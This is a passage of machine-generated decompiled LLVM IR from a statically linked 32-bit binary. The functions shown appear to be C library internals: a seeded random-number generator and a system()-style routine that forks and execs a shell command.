  %v1_8053884 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053884 = icmp ult i32 %v1_805387f, %v1_8053884
  %v1_8053886 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053886 = inttoptr i32 %v1_8053886 to i32*
  store i32 %v2_8053882, i32* %v2_8053886, align 4
  %v0_8053889 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053889 = add i32 %v0_8053889, 4
  store i32 %v1_8053889, i32* %eax.global-to-local, align 4
  br i1 %v7_8053884, label %dec_label_pc_8053892, label %dec_label_pc_805388e

dec_label_pc_805388e:                             ; preds = %dec_label_pc_8053871
  %v0_805388e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805388e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053897

dec_label_pc_8053892:                             ; preds = %dec_label_pc_8053871
  %v1_8053892 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053892 = icmp ult i32 %v1_8053889, %v1_8053892
  %v1_8053894 = icmp eq i1 %v7_8053892, false
  %v3_8053894 = load i32, i32* %esi.global-to-local, align 4
  %v4_8053894 = select i1 %v1_8053894, i32 %v3_8053894, i32 %v1_8053889
  store i32 %v4_8053894, i32* %eax.global-to-local, align 4
  %v0_8053897.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053897

dec_label_pc_8053897:                             ; preds = %dec_label_pc_805388e, %dec_label_pc_8053892
  %v0_8053897 = phi i32 [ %v0_805388e, %dec_label_pc_805388e ], [ %v0_8053897.pre, %dec_label_pc_8053892 ]
  %v1_8053897 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053897 = inttoptr i32 %v1_8053897 to i32*
  store i32 %v0_8053897, i32* %v2_8053897, align 4
  %v0_8053899 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053899 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053899 = add i32 %v1_8053899, 4
  %v3_8053899 = inttoptr i32 %v2_8053899 to i32*
  store i32 %v0_8053899, i32* %v3_8053899, align 4
  br label %dec_label_pc_805389c

dec_label_pc_805389c:                             ; preds = %dec_label_pc_805385a, %dec_label_pc_8053897
  %v2_805389c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805389c, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053865, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805389c, { 1, 0 }
  uselistorder label %dec_label_pc_8053897, { 1, 0 }
}

define i32 @function_80538a3(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_80538a3:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80538a3 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80538a7 = load i32, i32* @edi, align 4
  %v0_80538a8 = load i32, i32* @esi, align 4
  %v0_80538a9 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80538b5 = add i32 %tmp14, 12
  %v2_80538b5 = inttoptr i32 %v1_80538b5 to i32*
  %v3_80538b5 = load i32, i32* %v2_80538b5, align 4
  store i32 %v3_80538b5, i32* %ecx.global-to-local, align 4
  %v6_80538bb = icmp ugt i32 %v3_80538b5, 4
  br i1 %v6_80538bb, label %dec_label_pc_8053935, label %dec_label_pc_80538bd

dec_label_pc_80538bd:                             ; preds = %dec_label_pc_80538a3
  %v1_80538bd = add i32 %tmp14, 8
  %v2_80538bd = inttoptr i32 %v1_80538bd to i32*
  %v3_80538bd = load i32, i32* %v2_80538bd, align 4
  store i32 %v3_80538bd, i32* %ebx.global-to-local, align 4
  %v1_80538c0 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_80538c7 = select i1 %v1_80538c0, i32 1, i32 %arg1
  store i32 %v3_80538c7, i32* %edx.global-to-local, align 4
  %v1_80538ca = icmp eq i32 %v3_80538b5, 0
  %v2_80538cc = inttoptr i32 %v3_80538bd to i32*
  store i32 %v3_80538c7, i32* %v2_80538cc, align 4
  br i1 %v1_80538ca, label %dec_label_pc_8053933, label %dec_label_pc_80538d0

dec_label_pc_80538d0:                             ; preds = %dec_label_pc_80538bd
  %v0_80538d0 = load i32, i32* @esi, align 4
  %v1_80538d0 = add i32 %v0_80538d0, 16
  %v2_80538d0 = inttoptr i32 %v1_80538d0 to i32*
  %v3_80538d0 = load i32, i32* %v2_80538d0, align 4
  store i32 %v3_80538d0, i32* %eax.global-to-local, align 4
  %v0_80538d3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80538d3, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_80538da = sext i32 %v3_80538d0 to i64
  store i64 %v4_80538da, i64* %stack_var_-40, align 8
  %v5_805391032 = icmp sgt i32 %v3_80538d0, 1
  br i1 %v5_805391032, label %dec_label_pc_80538df, label %dec_label_pc_8053912

dec_label_pc_80538df:                             ; preds = %dec_label_pc_80538d0, %dec_label_pc_80538df.dec_label_pc_80538df_crit_edge
  %v0_8053907 = phi i32 [ %v0_8053907.pre, %dec_label_pc_80538df.dec_label_pc_80538df_crit_edge ], [ %v0_80538d3, %dec_label_pc_80538d0 ]
  %v0_80538df = load i32, i32* %edx.global-to-local, align 4
  %v1_80538e6 = ashr i32 %v0_80538df, 31
  %v2_80538e7 = zext i32 %v0_80538df to i64
  %v4_80538e7 = zext i32 %v1_80538e6 to i64
  %v5_80538e7 = mul nuw i64 %v4_80538e7, 4294967296
  %v6_80538e7 = or i64 %v5_80538e7, %v2_80538e7
  %v8_80538e7 = sdiv i64 %v6_80538e7, 127773
  %v9_80538e7 = trunc i64 %v8_80538e7 to i32
  %v10_80538e7 = srem i64 %v6_80538e7, 127773
  %v3_80538ed = mul nsw i64 %v10_80538e7, 16807
  %v4_80538ed = trunc i64 %v3_80538ed to i32
  %tmp24 = mul i32 %v9_80538e7, -2836
  %v2_80538f9 = add i32 %v4_80538ed, %tmp24
  %v1_80538fb = add i32 %v2_80538f9, 1
  %v6_80538fb = xor i32 %v2_80538f9, -2147483648
  %v7_80538fb = xor i32 %v1_80538fb, %v2_80538f9
  %v8_80538fb = and i32 %v7_80538fb, %v6_80538fb
  %v9_80538fb = icmp slt i32 %v8_80538fb, 0
  %v10_80538fb = icmp eq i32 %v1_80538fb, 0
  %v11_80538fb = icmp slt i32 %v1_80538fb, 0
  %v1_80538fe = add i32 %v2_80538f9, 2147483647
  store i32 %v1_80538fe, i32* %eax.global-to-local, align 4
  %v3_8053904 = icmp ne i1 %v11_80538fb, %v9_80538fb
  %v4_8053904 = or i1 %v10_80538fb, %v3_8053904
  %v7_8053904 = select i1 %v4_8053904, i32 %v1_80538fe, i32 %v2_80538f9
  store i32 %v7_8053904, i32* %edx.global-to-local, align 4
  %v1_8053907 = add i32 %v0_8053907, 4
  store i32 %v1_8053907, i32* %ecx.global-to-local, align 4
  %v2_805390a = inttoptr i32 %v1_8053907 to i32*
  store i32 %v7_8053904, i32* %v2_805390a, align 4
  %v0_805390c = load i32, i32* @edi, align 4
  %v1_805390c = add i32 %v0_805390c, 1
  store i32 %v1_805390c, i32* @edi, align 4
  %v3_805390d.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_805390d.pre to i32
  %v5_8053910 = icmp slt i32 %v1_805390c, %extract.t11
  br i1 %v5_8053910, label %dec_label_pc_80538df.dec_label_pc_80538df_crit_edge, label %dec_label_pc_805390d.dec_label_pc_8053912_crit_edge

dec_label_pc_80538df.dec_label_pc_80538df_crit_edge: ; preds = %dec_label_pc_80538df
  %v0_8053907.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80538df

dec_label_pc_805390d.dec_label_pc_8053912_crit_edge: ; preds = %dec_label_pc_80538df
  %v0_8053912.pre = load i32, i32* @esi, align 4
  %v0_8053915.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053912

dec_label_pc_8053912:                             ; preds = %dec_label_pc_805390d.dec_label_pc_8053912_crit_edge, %dec_label_pc_80538d0
  %v0_8053915 = phi i32 [ %v0_8053915.pre, %dec_label_pc_805390d.dec_label_pc_8053912_crit_edge ], [ %v0_80538d3, %dec_label_pc_80538d0 ]
  %v0_8053912 = phi i32 [ %v0_8053912.pre, %dec_label_pc_805390d.dec_label_pc_8053912_crit_edge ], [ %v0_80538d0, %dec_label_pc_80538d0 ]
  %v1_8053912 = add i32 %v0_8053912, 20
  %v2_8053912 = inttoptr i32 %v1_8053912 to i32*
  %v3_8053912 = load i32, i32* %v2_8053912, align 4
  store i32 %v3_8053912, i32* %eax.global-to-local, align 4
  %v2_8053915 = add i32 %v0_8053912, 4
  %v3_8053915 = inttoptr i32 %v2_8053915 to i32*
  store i32 %v0_8053915, i32* %v3_8053915, align 4
  %v0_8053918 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053918 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053918 = mul i32 %v1_8053918, 4
  %v3_8053918 = add i32 %v2_8053918, %v0_8053918
  store i32 %v3_8053918, i32* %eax.global-to-local, align 4
  %v1_805391b = load i32, i32* @esi, align 4
  %v2_805391b = inttoptr i32 %v1_805391b to i32*
  store i32 %v3_8053918, i32* %v2_805391b, align 4
  %v3_805391d = load i64, i64* %stack_var_-40, align 8
  %v6_805391d = mul nsw i64 %v3_805391d, 10
  %v7_805391d = trunc i64 %v6_805391d to i32
  %v2_8053923 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805393025 = add i32 %v7_805391d, -1
  %v9_805393029 = icmp slt i32 %v1_805393025, 0
  store i32 %v1_805393025, i32* @ebx, align 4
  %v1_805393130 = icmp eq i1 %v9_805393029, false
  br i1 %v1_805393130, label %dec_label_pc_8053923, label %dec_label_pc_8053933

dec_label_pc_8053923:                             ; preds = %dec_label_pc_8053912, %dec_label_pc_8053923
  store i32 %v2_8053923, i32* %eax.global-to-local, align 4
  %v0_8053928 = load i32, i32* @esi, align 4
  %v2_8053929 = inttoptr i32 %v0_8053928 to i32*
  %v3_8053929 = call i32 @function_8053845(i32* %v2_8053929, i32 %v2_8053923)
  store i32 %v0_8053928, i32* %eax.global-to-local, align 4
  store i32 %v2_8053923, i32* %edx.global-to-local, align 4
  %v0_8053930.pre = load i32, i32* @ebx, align 4
  %v1_8053930 = add i32 %v0_8053930.pre, -1
  %v9_8053930 = icmp slt i32 %v1_8053930, 0
  store i32 %v1_8053930, i32* @ebx, align 4
  %v1_8053931 = icmp eq i1 %v9_8053930, false
  br i1 %v1_8053931, label %dec_label_pc_8053923, label %dec_label_pc_8053933

dec_label_pc_8053933:                             ; preds = %dec_label_pc_8053912, %dec_label_pc_8053923, %dec_label_pc_80538bd
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053935

dec_label_pc_8053935:                             ; preds = %dec_label_pc_80538a3, %dec_label_pc_8053933
  %v0_805393c = phi i32 [ -1, %dec_label_pc_80538a3 ], [ 0, %dec_label_pc_8053933 ]
  store i32 %v0_80538a9, i32* @ebx, align 4
  store i32 %v0_80538a8, i32* @esi, align 4
  store i32 %v0_80538a7, i32* @edi, align 4
  store i32 %v0_80538a3, i32* @ebp, align 4
  ret i32 %v0_805393c

; uselistorder directives
  uselistorder i32 %v1_8053930, { 1, 0 }
  uselistorder i32 %v0_8053912, { 1, 0 }
  uselistorder i32 %v1_80538fb, { 2, 1, 0 }
  uselistorder i32 %v2_80538f9, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_80538d3, { 1, 0, 2 }
  uselistorder i32 %v3_80538b5, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8053935, { 1, 0 }
  uselistorder label %dec_label_pc_8053933, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053923, { 1, 0 }
  uselistorder label %dec_label_pc_80538df, { 1, 0 }
}

define i32 @function_805393d(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805393d:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_805393f = load i32, i32* @esi, align 4
  %v0_8053940 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8053961, label %dec_label_pc_8053955

dec_label_pc_8053955:                             ; preds = %dec_label_pc_805393d
  %v2_8053955 = icmp ult i32 %arg3, 256
  %v1_805395c = select i1 %v2_8053955, i32 5, i32 4
  store i32 %v1_805395c, i32* @ebx, align 4
  br label %dec_label_pc_8053977

dec_label_pc_8053961:                             ; preds = %dec_label_pc_805393d
  %v6_8053964 = icmp ugt i32 %arg3, 31
  br i1 %v6_8053964, label %dec_label_pc_805396f, label %dec_label_pc_8053966

dec_label_pc_8053966:                             ; preds = %dec_label_pc_8053961
  store i32 0, i32* @ebx, align 4
  %v6_805396b = icmp ugt i32 %arg3, 7
  br i1 %v6_805396b, label %dec_label_pc_8053977, label %dec_label_pc_80539c7

dec_label_pc_805396f:                             ; preds = %dec_label_pc_8053961
  %v2_805396f = icmp ult i32 %arg3, 64
  %v1_8053974 = select i1 %v2_805396f, i32 3, i32 2
  store i32 %v1_8053974, i32* @ebx, align 4
  br label %dec_label_pc_8053977

dec_label_pc_8053977:                             ; preds = %dec_label_pc_8053966, %dec_label_pc_8053955, %dec_label_pc_805396f
  %v0_8053981 = phi i32 [ 0, %dec_label_pc_8053966 ], [ %v1_805395c, %dec_label_pc_8053955 ], [ %v1_8053974, %dec_label_pc_805396f ]
  %v1_8053977 = mul nuw nsw i32 %v0_8053981, 4
  %v2_8053977 = add i32 %v1_8053977, ptrtoint (i32* @global_var_805cd74.369 to i32)
  %v3_8053977 = inttoptr i32 %v2_8053977 to i32*
  %v4_8053977 = load i32, i32* %v3_8053977, align 4
  store i32 %v4_8053977, i32* %eax.global-to-local, align 4
  %v1_805397e = add i32 %tmp7, 4
  store i32 %v1_805397e, i32* @esi, align 4
  %v2_8053981 = add i32 %v1_8053977, ptrtoint (i32* @global_var_805cd60.370 to i32)
  %v3_8053981 = inttoptr i32 %v2_8053981 to i32*
  %v4_8053981 = load i32, i32* %v3_8053981, align 4
  store i32 %v4_8053981, i32* %edx.global-to-local, align 4
  %v2_8053988 = add i32 %arg4, 12
  %v3_8053988 = inttoptr i32 %v2_8053988 to i32*
  store i32 %v0_8053981, i32* %v3_8053988, align 4
  %v0_805398b = load i32, i32* @esi, align 4
  %v1_805398b = load i32, i32* @edi, align 4
  %v2_805398b = add i32 %v1_805398b, 8
  %v3_805398b = inttoptr i32 %v2_805398b to i32*
  store i32 %v0_805398b, i32* %v3_805398b, align 4
  %v0_805398e = load i32, i32* %eax.global-to-local, align 4
  %v1_805398e = load i32, i32* @edi, align 4
  %v2_805398e = add i32 %v1_805398e, 16
  %v3_805398e = inttoptr i32 %v2_805398e to i32*
  store i32 %v0_805398e, i32* %v3_805398e, align 4
  %v0_8053991 = load i32, i32* @esi, align 4
  %v1_8053991 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053991 = mul i32 %v1_8053991, 4
  %v3_8053991 = add i32 %v2_8053991, %v0_8053991
  store i32 %v3_8053991, i32* %eax.global-to-local, align 4
  %v0_8053994 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053994 = load i32, i32* @edi, align 4
  %v2_8053994 = add i32 %v1_8053994, 20
  %v3_8053994 = inttoptr i32 %v2_8053994 to i32*
  store i32 %v0_8053994, i32* %v3_8053994, align 4
  %v0_8053997 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053997 = load i32, i32* @edi, align 4
  %v2_8053997 = add i32 %v1_8053997, 24
  %v3_8053997 = inttoptr i32 %v2_8053997 to i32*
  store i32 %v0_8053997, i32* %v3_8053997, align 4
  %v0_805399a = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_805399f = inttoptr i32 %v0_805399a to i32*
  %v3_805399f = call i32 @function_80538a3(i32 %arg1, i32* %v2_805399f)
  %v0_80539a4 = load i32, i32* @ebp, align 4
  %v1_80539a4 = inttoptr i32 %v0_80539a4 to i32*
  store i32 0, i32* %v1_80539a4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80539af = load i32, i32* @ebx, align 4
  %v1_80539af = icmp eq i32 %v0_80539af, 0
  br i1 %v1_80539af, label %dec_label_pc_80539e0, label %dec_label_pc_80539b3

dec_label_pc_80539b3:                             ; preds = %dec_label_pc_8053977
  %v0_80539b3 = load i32, i32* @edi, align 4
  %v1_80539b3 = add i32 %v0_80539b3, 4
  %v2_80539b3 = inttoptr i32 %v1_80539b3 to i32*
  %v3_80539b3 = load i32, i32* %v2_80539b3, align 4
  %v1_80539b6 = load i32, i32* @esi, align 4
  %v2_80539b6 = sub i32 %v3_80539b3, %v1_80539b6
  %v2_80539b8 = sdiv i32 %v2_80539b6, 4
  %v3_80539bb = mul i32 %v2_80539b8, 5
  %v2_80539be = add i32 %v3_80539bb, %v0_80539af
  %v1_80539c0 = load i32, i32* @ebp, align 4
  %v2_80539c0 = inttoptr i32 %v1_80539c0 to i32*
  store i32 %v2_80539be, i32* %v2_80539c0, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539e0

dec_label_pc_80539c7:                             ; preds = %dec_label_pc_8053966
  %v1_80539c7 = call i32 @function_8050f90(i32 %v0_8053940)
  store i32 %v1_80539c7, i32* %eax.global-to-local, align 4
  %v1_80539cc = inttoptr i32 %v1_80539c7 to i32*
  store i32 22, i32* %v1_80539cc, align 4
  %v0_80539d2 = load i32, i32* %stack_var_-36, align 4
  %v1_80539d2 = call i32 @function_8050f90(i32 %v0_80539d2)
  %v1_80539d7 = inttoptr i32 %v1_80539d2 to i32*
  store i32 22, i32* %v1_80539d7, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539e0

dec_label_pc_80539e0:                             ; preds = %dec_label_pc_8053977, %dec_label_pc_80539b3, %dec_label_pc_80539c7
  %v0_80539e7 = phi i32 [ 0, %dec_label_pc_8053977 ], [ 0, %dec_label_pc_80539b3 ], [ -1, %dec_label_pc_80539c7 ]
  store i32 %v0_805393f, i32* @esi, align 4
  ret i32 %v0_80539e7

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80539e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053977, { 2, 0, 1 }
}

define i32 @function_80539e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80539e8:
  %stack_var_-8 = alloca i32, align 4
  %v4_80539f1 = icmp eq i32 %arg1, 0
  br i1 %v4_80539f1, label %dec_label_pc_8053b14, label %dec_label_pc_80539fc

dec_label_pc_80539fc:                             ; preds = %dec_label_pc_80539e8
  %v2_8053a02 = call i32 @function_8052880(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053a11 = call i32 @function_8052880(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8053a20 = call i32 @function_8052880(i32 17, i32 0)
  %v1_8053a29 = call i32 @function_8050a24(i32 %v2_8053a20)
  %v2_8053a31 = icmp slt i32 %v1_8053a29, 0
  store i32 %v1_8053a29, i32* @ebx, align 4
  %v2_8053a36 = icmp eq i1 %v2_8053a31, false
  br i1 %v2_8053a36, label %dec_label_pc_8053a67, label %dec_label_pc_8053a38

dec_label_pc_8053a38:                             ; preds = %dec_label_pc_80539fc
  %v2_8053a40 = call i32 @function_8052880(i32 3, i32 %v2_8053a02)
  store i32 %v2_8053a02, i32* @edx, align 4
  %v2_8053a4d = call i32 @function_8052880(i32 2, i32 %v2_8053a11)
  store i32 2, i32* @ebx, align 4
  %v2_8053a5a = call i32 @function_8052880(i32 17, i32 %v2_8053a20)
  br label %dec_label_pc_8053b11

dec_label_pc_8053a67:                             ; preds = %dec_label_pc_80539fc
  %v1_8053a31 = icmp eq i32 %v1_8053a29, 0
  %v1_8053a67 = icmp eq i1 %v1_8053a31, false
  br i1 %v1_8053a67, label %dec_label_pc_8053ab3, label %dec_label_pc_8053a69

dec_label_pc_8053a69:                             ; preds = %dec_label_pc_8053a67
  %v2_8053a6f = call i32 @function_8052880(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8053a7a = call i32 @function_8052880(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8053a85 = call i32 @function_8052880(i32 17, i32 0)
  %v8_8053aa4 = call i32 @function_8053cd8(i32 ptrtoint ([8 x i8]* @global_var_805cd8b.373 to i32), i32 ptrtoint ([3 x i8]* @global_var_805cd90.372 to i32), i32 ptrtoint ([3 x i8]* @global_var_805cd88.371 to i32), i32 %arg1, i32 0)
  %v1_8053aae = call i32 @function_8050ad4(i32 127)
  unreachable

dec_label_pc_8053ab3:                             ; preds = %dec_label_pc_8053a67
  %v2_8053ab9 = call i32 @function_8052880(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053ac4 = call i32 @function_8052880(i32 2, i32 1)
  %v2_8053ac9 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8053ad2 = load i32, i32* @ebx, align 4
  %v8_8053ad3 = call i32 @function_80545cc(i32 %v0_8053ad2, i32 %v2_8053ac9, i32 0, %rusage* null)
  %v8_8053ade = icmp eq i32 %v8_8053ad3, -1
  %v1_8053adf = icmp eq i1 %v8_8053ade, false
  %v6_8053adf = load i32, i32* %stack_var_-8, align 4
  %v7_8053adf = select i1 %v1_8053adf, i32 %v6_8053adf, i32 -1
  store i32 %v7_8053adf, i32* @edx, align 4
  store i32 %v7_8053adf, i32* %stack_var_-8, align 4
  %v2_8053aee = call i32 @function_8052880(i32 3, i32 %v2_8053a02)
  store i32 %v2_8053a02, i32* @ebx, align 4
  %v2_8053afb = call i32 @function_8052880(i32 2, i32 %v2_8053a11)
  store i32 %v2_8053a11, i32* @edx, align 4
  %v2_8053b08 = call i32 @function_8052880(i32 17, i32 %v2_8053a20)
  %v3_8053b0d = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053b11

dec_label_pc_8053b11:                             ; preds = %dec_label_pc_8053a38, %dec_label_pc_8053ab3
  %storemerge = phi i32 [ -1, %dec_label_pc_8053a38 ], [ %v3_8053b0d, %dec_label_pc_8053ab3 ]
  br label %dec_label_pc_8053b14

dec_label_pc_8053b14:                             ; preds = %dec_label_pc_80539e8, %dec_label_pc_8053b11
  %v0_8053b18 = phi i32 [ 1, %dec_label_pc_80539e8 ], [ %storemerge, %dec_label_pc_8053b11 ]
  ret i32 %v0_8053b18

; uselistorder directives
  uselistorder i32 %v1_8053a29, { 2, 0, 1 }
  uselistorder i32 %v2_8053a20, { 1, 0, 2 }
  uselistorder i32 %v2_8053a11, { 0, 2, 1 }
  uselistorder i32 %v2_8053a02, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_8053cd8, { 1, 0 }
  uselistorder i32 (i32)* @function_8050a24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8052880, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053b14, { 1, 0 }
  uselistorder label %dec_label_pc_8053b11, { 1, 0 }
}

define i32 @function_8053c70(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053c70:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053c83 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053c83, i32* @ebx, align 4
  %v2_8053c88 = call i32 @function_805405a(i32 %v2_8053c83, i32 134561879)
  %v1_8053c94 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e860.374 to i32))
  %v0_8053c99 = load i32, i32* @global_var_8064b04.375, align 4
  store i32 %v0_8053c99, i32* @eax, align 4
  %v1_8053ca1 = icmp eq i32 %v0_8053c99, 0
  br i1 %v1_8053ca1, label %dec_label_pc_8053cae, label %dec_label_pc_8053ca5

dec_label_pc_8053ca5:                             ; preds = %dec_label_pc_8053c70
  %v0_8053ca8 = load i32, i32* @esi, align 4
  %v1_8053ca9 = call i32 @unknown_0(i32 %v0_8053ca8)
  store i32 %v1_8053ca9, i32* @eax, align 4
  br label %dec_label_pc_8053cae

dec_label_pc_8053cae:                             ; preds = %dec_label_pc_8053c70, %dec_label_pc_8053ca5
  %v2_8053cb3 = call i32 @function_805405a(i32 %v2_8053c83, i32 1)
  %v0_8053cb8 = call i32 @function_8054018()
  %v0_8053cc9 = call i32 @function_80510e2()
  %v0_8053cd1 = load i32, i32* @esi, align 4
  %v1_8053cd2 = call i32 @function_8050ad4(i32 %v0_8053cd1)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8050ad4, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_8053cae, { 1, 0 }
}

define i32 @function_8053cd8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8053cd8:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8053cde = load i32, i32* @ebx, align 4
  store i32 %v0_8053cde, i32* %stack_var_-12, align 4
  %v2_8053cdf = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8053cdf, i32* %eax.global-to-local, align 4
  %v12_8053ce2 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053ce8

dec_label_pc_8053ce8:                             ; preds = %dec_label_pc_8053ce8, %dec_label_pc_8053cd8
  %v0_8053ceb = phi i32 [ 0, %dec_label_pc_8053cd8 ], [ %v1_8053ceb, %dec_label_pc_8053ce8 ]
  %stack_var_-16.0 = phi i32 [ %v2_8053cdf, %dec_label_pc_8053cd8 ], [ %v1_8053cec, %dec_label_pc_8053ce8 ]
  %v1_8053ceb = add i32 %v0_8053ceb, 1
  store i32 %v1_8053ceb, i32* %esi.global-to-local, align 4
  %v1_8053cec = add i32 %stack_var_-16.0, 4
  store i32 %v1_8053cec, i32* %eax.global-to-local, align 4
  %v1_8053cf2 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8053cf2 = load i32, i32* %v1_8053cf2, align 4
  %v3_8053cf2 = icmp eq i32 %v2_8053cf2, 0
  %v1_8053cf5 = icmp eq i1 %v3_8053cf2, false
  br i1 %v1_8053cf5, label %dec_label_pc_8053ce8, label %dec_label_pc_8053cf7

dec_label_pc_8053cf7:                             ; preds = %dec_label_pc_8053ce8
  %v1_8053cf7 = mul i32 %v1_8053ceb, 4
  %v2_8053cf7 = add i32 %v1_8053cf7, 34
  %v1_8053cfe = and i32 %v2_8053cf7, -16
  %v2_8053d01 = sub i32 %v12_8053ce2, %v1_8053cfe
  %v1_8053d06 = add i32 %v2_8053d01, 15
  %v1_8053d0a = and i32 %v1_8053d06, -16
  store i32 %v1_8053d0a, i32* @ebx, align 4
  store i32 %v1_8053d0a, i32* %ecx.global-to-local, align 4
  %v2_8053d0f = inttoptr i32 %v1_8053d0a to i32*
  store i32 %arg2, i32* %v2_8053d0f, align 16
  store i32 %v2_8053cdf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d17

dec_label_pc_8053d17:                             ; preds = %dec_label_pc_8053d17, %dec_label_pc_8053cf7
  %stack_var_-16.1 = phi i32 [ %v2_8053cdf, %dec_label_pc_8053cf7 ], [ %v1_8053d1e, %dec_label_pc_8053d17 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8053d1a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053d1a = add i32 %v0_8053d1a, 4
  store i32 %v1_8053d1a, i32* %ecx.global-to-local, align 4
  %v0_8053d1d = load i32, i32* %esi.global-to-local, align 4
  %v1_8053d1d = add i32 %v0_8053d1d, -1
  %v8_8053d1d = icmp eq i32 %v1_8053d1d, 0
  store i32 %v1_8053d1d, i32* %esi.global-to-local, align 4
  %v1_8053d1e = add i32 %stack_var_-16.1, 4
  %v1_8053d24 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8053d24 = load i32, i32* %v1_8053d24, align 4
  store i32 %v2_8053d24, i32* %eax.global-to-local, align 4
  %v2_8053d26 = inttoptr i32 %v1_8053d1a to i32*
  store i32 %v2_8053d24, i32* %v2_8053d26, align 4
  %v1_8053d28 = icmp eq i1 %v8_8053d1d, false
